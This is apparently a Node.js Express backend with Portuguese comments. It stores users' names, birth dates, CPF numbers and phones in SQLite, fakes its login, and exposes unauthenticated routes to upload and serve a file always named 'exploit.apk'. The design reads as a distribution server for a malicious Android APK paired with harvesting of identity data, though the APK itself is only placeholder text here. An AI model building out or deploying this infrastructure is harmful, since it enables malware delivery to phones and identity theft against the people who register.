const express = require('express');
const cors = require('cors');
const multer = require('multer');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Configurações
app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Serve arquivos estáticos (HTML, CSS, JS)
app.use('/uploads', express.static('uploads'));

// Cria pasta de uploads se não existir
if (!fs.existsSync('./uploads')) {
    fs.mkdirSync('./uploads', { recursive: true });
}

// Adiciona um arquivo APK de exemplo se não existir (para testes)
const sampleApkPath = './uploads/exploit.apk';
if (!fs.existsSync(sampleApkPath)) {
    fs.writeFileSync(sampleApkPath, 'APK_SAMPLE_CONTENT');
    console.log('Arquivo APK de exemplo criado.');
}

// Configuração do Banco de Dados (SQLite)
const db = new sqlite3.Database('./database.sqlite');

db.serialize(() => {
    // Tabela de Usuários
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        birth_date TEXT,
        cpf TEXT,
        phone TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Tabela de Configuração do APK Explorador
    db.run(`CREATE TABLE IF NOT EXISTS settings (
        id INTEGER PRIMARY KEY,
        exploit_apk_url TEXT
    )`);

    // Inserir configuração padrão se não existir
    db.get("SELECT * FROM settings WHERE id = 1", (err, row) => {
        if (!row) {
            db.run("INSERT INTO settings (id, exploit_apk_url) VALUES (1, 'http://localhost:3000/uploads/exploit.apk')");
        }
    });
});

// Configuração do Multer para upload de APK
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads/');
    },
    filename: (req, file, cb) => {
        cb(null, 'exploit.apk'); // Sempre sobrescreve o APK atual
    }
});
const upload = multer({ storage: storage });

// --- ROTAS ---

// 1. Cadastrar Usuário
app.post('/api/register', (req, res) => {
    const { name, birth_date, cpf, phone } = req.body;
    const sql = `INSERT INTO users (name, birth_date, cpf, phone) VALUES (?, ?, ?, ?)`;
    
    db.run(sql, [name, birth_date, cpf, phone], function(err) {
        if (err) {
            return res.status(400).json({ error: err.message });
        }
        res.json({ message: 'Usuário cadastrado com sucesso', id: this.lastID });
    });
});

// 2. Login (Simulado)
app.post('/api/login', (req, res) => {
    // Aqui você validaria contra o banco, mas para o fluxo vamos aceitar qualquer login válido
    res.json({ token: 'fake-jwt-token-123', user: { name: 'Usuario Teste' } });
});

// 3. Obter URL do APK Explorador
app.get('/api/get-exploit-apk', (req, res) => {
    db.get("SELECT exploit_apk_url FROM settings WHERE id = 1", (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ apkUrl: row.exploit_apk_url });
    });
});

// 4. Upload do APK Explorador
app.post('/api/upload-exploit', upload.single('apk'), (req, res) => {
    if (!req.file) return res.status(400).send('Nenhum arquivo enviado.');
    
    const url = `http://${req.headers.host}/uploads/exploit.apk`;
    
    db.run("UPDATE settings SET exploit_apk_url = ? WHERE id = 1", [url], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ message: 'APK atualizado com sucesso', url: url });
    });
});

app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
});